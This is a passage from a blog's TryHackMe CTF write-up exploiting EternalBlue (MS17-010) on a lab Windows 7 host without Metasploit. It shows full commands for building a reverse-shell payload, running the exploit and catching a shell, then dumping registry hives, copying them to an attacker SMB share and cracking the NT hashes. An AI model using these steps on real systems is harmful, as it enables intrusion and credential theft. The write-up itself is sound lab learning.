</span></span></code></pre></div><p>Once agaiin, the scans lead to the same conclusion that the host is vulnerable to eternalblue. So the next step was to hop on google and <a href=https://www.exploit-db.com target=_blank rel=noopener>exploitdb</a> to start looking for an exploit.</p><h3 id=preparing-the-attack-1>Preparing the attack <a href=#preparing-the-attack-1 class=anchor>üîó</a></h3><p>The first result that turned up was an exploit from Sleepya <a href=https://www.exploit-db.com/exploits/42031 target=_blank rel=noopener>Microsoft Windows 7/2008 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</a>, whereas google pointed me to <a href=https://github.com/worawit/MS17-010/ target=_blank rel=noopener>worawit/MS17-010</a>. Upon further inspection, they looked to like the same exploit, but the worawit link provided shellcode that could be used as the basis for a payload.</p><p>Looking deeper into the <a href=https://github.com/worawit/MS17-010/blob/master/shellcode/eternalblue_kshellcode_x64.asm target=_blank rel=noopener>eternalblue_kshellcode_x64.asm shellcode</a>, it looked like the shellcode expected a user payload to be appended to the end of the binary both of which still needed to be prepared.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span>userland_start:
</span></span><span style=display:flex><span>userland_start_thread:
</span></span><span style=display:flex><span>    <span style=color:#75715e>; CreateThread(NULL, 0, &amp;threadstart, NULL, 0, NULL)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>xchg</span> <span style=color:#66d9ef>rdx</span>, <span style=color:#66d9ef>rax</span>   <span style=color:#75715e>; rdx is CreateThread address passed from kernel
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>xor</span> <span style=color:#66d9ef>ecx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; lpThreadAttributes = NULL
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; lpThreadId = NULL
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rcx</span>        <span style=color:#75715e>; dwCreationFlags = 0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>r9</span>, <span style=color:#66d9ef>rcx</span>     <span style=color:#75715e>; lpParameter = NULL
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>lea</span> <span style=color:#66d9ef>r8</span>, [<span style=color:#66d9ef>rel</span> <span style=color:#66d9ef>userland_payload</span>]  <span style=color:#75715e>; lpStartAddr
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>edx</span>, <span style=color:#66d9ef>ecx</span>    <span style=color:#75715e>; dwStackSize = 0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>sub</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>call</span> <span style=color:#66d9ef>rax</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>add</span> <span style=color:#66d9ef>rsp</span>, <span style=color:#ae81ff>0x30</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>ret</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>userland_payload:
</span></span></code></pre></div><p>With all this in mind, I then pulled down the python exploit script and shellcode and assembled the latter with nasm as a flat binary. Then I generated an unstaged tcp reverse shell for windows as a payload, also a flat binary, and joined the contents contents into a single <code>sc_joined.bin</code> payload. One pointless thing to note is I added an arbitrary nop sled to the payload. This could have been left out.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/scans# cd ../
</span></span><span style=display:flex><span>root@kali:~/ctf# mkdir exploits <span style=color:#f92672>&amp;&amp;</span> cd exploits
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# curl -o 42031.py https://www.exploit-db.com/raw/42031
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# curl -sO https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows -f raw -n100 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span> LHOST<span style=color:#f92672>=</span>10.10.47.175 &gt; reverse.bin
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Successfully added NOP sled of size <span style=color:#ae81ff>100</span> from x64/simple
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>560</span> bytes
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# ls
</span></span><span style=display:flex><span>42031.py  eternalblue_kshellcode_x64.asm  reverse.bin  sc_joined.bin  sc_x64_kernel.bin
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# cat sc_x64_kernel.bin reverse.bin &gt; sc_joined.bin 
</span></span></code></pre></div><h4 id=attacking>Attacking <a href=#attacking class=anchor>üîó</a></h4><p>To prepare to catch the reverse shell, I started a netcat listener on port 443 in a new terminal. Then I returned to the original to install the single required python dependency <code>impacket</code> and kick off the attack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/exploits# pip2 install impacket
</span></span><span style=display:flex><span>... 
</span></span><span style=display:flex><span>root@kali:~/ctf/exploits# python2 42031.py $ATTACKTARGET sc_joined.bin <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>shellcode size: <span style=color:#ae81ff>1332</span>
</span></span><span style=display:flex><span>numGroomConn: <span style=color:#ae81ff>20</span>
</span></span><span style=display:flex><span>Target OS: Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>SMB1 session setup allocate nonpaged pool success
</span></span><span style=display:flex><span>SMB1 session setup allocate nonpaged pool success
</span></span><span style=display:flex><span>good response status: INVALID_PARAMETER
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div><p>I switched back to our open netcat process to confirm the success of the attack and was happy to find a Windows shell prompt.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.47.175<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.87.38<span style=color:#f92672>]</span> <span style=color:#ae81ff>49170</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.1.7601<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
</span></span></code></pre></div><h3 id=foothold-1>Foothold <a href=#foothold-1 class=anchor>üîó</a></h3><p>Unlike the first attack I knew this windows shell was extremely limited, so my first priority was to try to egress credentials so that I could escalate to a more stable point of access.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\system32&gt;net user
</span></span><span style=display:flex><span>net user
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User accounts <span style=color:#66d9ef>for</span> \\
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator            Guest                    Jon                      
</span></span><span style=display:flex><span>The command completed with one or more errors.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\Windows\system32&gt;cd ../../
</span></span><span style=display:flex><span>cd ../../
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;reg.exe save hklm\sam C:\sam.save
</span></span><span style=display:flex><span>reg.exe save hklm\sam C:\sam.save
</span></span><span style=display:flex><span>The operation completed successfully.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;reg.exe save hklm\security C:\security.save
</span></span><span style=display:flex><span>reg.exe save hklm\security C:\security.save
</span></span><span style=display:flex><span>The operation completed successfully.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;reg.exe save hklm\system c:\system.save
</span></span><span style=display:flex><span>reg.exe save hklm\system C:\system.save
</span></span><span style=display:flex><span>The operation completed successfully.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;dir
</span></span><span style=display:flex><span>dir
</span></span><span style=display:flex><span> Volume <span style=color:#66d9ef>in</span> drive C has no label.
</span></span><span style=display:flex><span> Volume Serial Number is E611-0B66
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:\
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>03/17/2019  01<span style=color:#960050;background-color:#1e0010>:</span>27 PM                24 flag1.txt
</span></span><span style=display:flex><span>07/13/2009  09<span style=color:#960050;background-color:#1e0010>:</span>20 PM    &lt;DIR&gt;          PerfLogs
</span></span><span style=display:flex><span>04/12/2011  02<span style=color:#960050;background-color:#1e0010>:</span>28 AM    &lt;DIR&gt;          Program Files
</span></span><span style=display:flex><span>03/17/2019  04<span style=color:#960050;background-color:#1e0010>:</span>28 PM    &lt;DIR&gt;          Program Files (x86)
</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>18 PM            24,576 sam.save
</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>18 PM            24,576 security.save
</span></span><span style=display:flex><span>11/10/2020  10<span style=color:#960050;background-color:#1e0010>:</span>19 PM        12,353,536 system.save
</span></span><span style=display:flex><span>12/12/2018  09<span style=color:#960050;background-color:#1e0010>:</span>13 PM    &lt;DIR&gt;          Users
</span></span><span style=display:flex><span>03/17/2019  04<span style=color:#960050;background-color:#1e0010>:</span>36 PM    &lt;DIR&gt;          Windows
</span></span><span style=display:flex><span>               4 File(s)     12,402,712 bytes
</span></span><span style=display:flex><span>               5 Dir(s)  20,753,133,568 bytes free
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;type flag1.txt
</span></span><span style=display:flex><span>type flag1.txt
</span></span><span style=display:flex><span>flag{access_the_machine}
</span></span><span style=display:flex><span>C:\&gt;
</span></span></code></pre></div><p>The first step was identifying the local users and attempting to dump some crucial registers that I could attack offline. While doing this I happened to dump these registry hives to the root of the <code>C:\</code> drive which happened to point out the first flag <code>flag{access_the_machine}</code>. In hindsight this was probably a poor choice of location as it would be much more likely to be caught here than in other locations.</p><p>Now that I had the hives dumped on disk I still needed to figure out how to egress them to my local machine for further attack. This lead me to reference an example from <a href=https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb target=_blank rel=noopener>ropnop&rsquo;s blog</a> pointing me towards the impacket-smbserver which comes preinstalled on Kali. I could interact with SMB from the cmd shell with out the need for an interactive shell or any other tools.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/# mkdir -p ctf/extractor <span style=color:#f92672>&amp;&amp;</span> cd ctf/extractor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@kali:~/ctf/extractor# impacket-smbserver BLUE $PWD
</span></span><span style=display:flex><span>Impacket v0.9.21 - Copyright <span style=color:#ae81ff>2020</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Callback added <span style=color:#66d9ef>for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Callback added <span style=color:#66d9ef>for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Config file parsed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@kali:~# netstat -plunt | grep <span style=color:#ae81ff>445</span>
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:445             0.0.0.0:*               LISTEN      1428/python3
</span></span></code></pre></div><p>From the target host I was now able to validate that I could see and connect to the newly started share and promptly copied the hives back to my attack machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\&gt;net view \\10.10.47.175
</span></span><span style=display:flex><span>net view \\10.10.47.175
</span></span><span style=display:flex><span>Shared resources at \\10.10.47.175
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(null)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Share name  Type  Used as  Comment  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>BLUE        Disk                    
</span></span><span style=display:flex><span>The command completed successfully.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;copy C:\sam.save \\10.10.47.175\BLUE\sam.save
</span></span><span style=display:flex><span>copy C:\sam.save \\10.10.47.175\BLUE\sam.save
</span></span><span style=display:flex><span>        1 file(s) copied.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;copy C:\security.save \\10.10.47.175\BLUE\security.save
</span></span><span style=display:flex><span>copy C:\security.save \\10.10.47.175\BLUE\security.save
</span></span><span style=display:flex><span>        1 file(s) copied.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\&gt;copy C:\system.save \\10.10.47.175\BLUE\system.save
</span></span><span style=display:flex><span>copy C:\system.save \\10.10.47.175\BLUE\system.save
</span></span><span style=display:flex><span>        1 file(s) copied.
</span></span></code></pre></div><p>With these credentials now available locally, I could extract the user hashes using <code>secretsdump</code> from impacket and perform the same attack with <code>john</code> that I had performed before.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
</span></span><span style=display:flex><span>Impacket v0.9.21 - Copyright <span style=color:#ae81ff>2020</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Target system bootKey: 0x55bd17830e678f18a3110daf2c17d4c7
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping local SAM hashes <span style=color:#f92672>(</span>uid:rid:lmhash:nthash<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping cached domain logon information <span style=color:#f92672>(</span>domain/username:hash<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping LSA Secrets
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> DPAPI_SYSTEM 
</span></span><span style=display:flex><span>dpapi_machinekey:0xdc31ac35e19a18b00b5b066de3e8da898bf8da71
</span></span><span style=display:flex><span>dpapi_userkey:0xfaea7403f42b58e1a5dd35ee816185a953b1c795
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> NL$KM 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0000</span>   <span style=color:#ae81ff>45</span> <span style=color:#ae81ff>94</span> 4A <span style=color:#ae81ff>93</span> A2 9D D2 8E  2B CF 5F DF <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>59</span> 4C   E.J.....+._.fuYL
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0010</span>   E9 BC B8 <span style=color:#ae81ff>91</span> 2C <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>59</span> 1E  BF <span style=color:#ae81ff>53</span> 1E <span style=color:#ae81ff>77</span> BE C2 9B <span style=color:#ae81ff>74</span>   ....,fY..S.w...t
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0020</span>   <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>04</span> B4 <span style=color:#ae81ff>56</span> EA 7D 6F  BA C2 1B 7E F0 BA <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>67</span>   sd..V.<span style=color:#f92672>}</span>o...~..Sg
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0030</span>   E6 E6 <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>95</span> 1F <span style=color:#ae81ff>90</span> <span style=color:#ae81ff>60</span>  <span style=color:#ae81ff>42</span> EE <span style=color:#ae81ff>34</span> 0A EE <span style=color:#ae81ff>99</span> 9F <span style=color:#ae81ff>55</span>   ..f....<span style=color:#e6db74>`</span>B.4....U
</span></span><span style=display:flex><span>NL$KM:45944a93a29dd28e2bcf5fdf6675594ce9bcb8912c66591ebf531e77bec29b74736404b456ea7d6fbac21b7ef0ba5367e6e66684951f906042ee340aee999f55
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Cleaning up...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@kali:~/ctf/extractor# impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL | egrep <span style=color:#e6db74>&#39;Administrator|Guest|Jon&#39;</span> &gt; hash.txt
</span></span><span style=display:flex><span>root@kali:~/ctf/extractor# john -format<span style=color:#f92672>=</span>NT --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt 
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>2</span> password hashes with no different salts <span style=color:#f92672>(</span>NT <span style=color:#f92672>[</span>MD4 256/256 AVX2 8x3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>                 <span style=color:#f92672>(</span>Administrator<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>alqfna22         <span style=color:#f92672>(</span>Jon<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2g 0:00:00:00 DONE <span style=color:#f92672>(</span>2020-11-11 13:43<span style=color:#f92672>)</span> 2.985g/s 15224Kp/s 15224Kc/s 15231KC/s alr19882006..alpusidi
</span></span><span style=display:flex><span>Warning: passwords printed above might not be all those cracked
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><h3 id=wrapping-up-1>Wrapping Up <a href=#wrapping-up-1 class=anchor>üîó</a></h3><p>With the credentials in hand I decided to try my had at a remote desktop session. Which happily gave me access to a desktop.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# rdesktop -u Jon 10.10.87.38
</span></span></code></pre></div><p><p class=markdown-image><img src=/images/blue_boot2root_jon_pc.png alt="Jon&amp;rsquo;s PC"></p></p><h2 id=summary>Summary <a href=#summary class=anchor>üîó</a></h2><p>This experience really hammered in how many of the tedious tasks metasploit handles silently. It deals with, assiting in sourcing and packing an exploit, capturing the outputs of scans, handling setting up listeners and catching shells. Additionally, the value that meterpreter provides in stabalizing a shell, transfering files and pivoting is easy to take for granted until it is no longer available. Despite having to do many of those tasks manually, it was massively educational to be forced to read and understand exploit I had attempted and then pivot with the resources only available on the target&rsquo;s limited shell.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>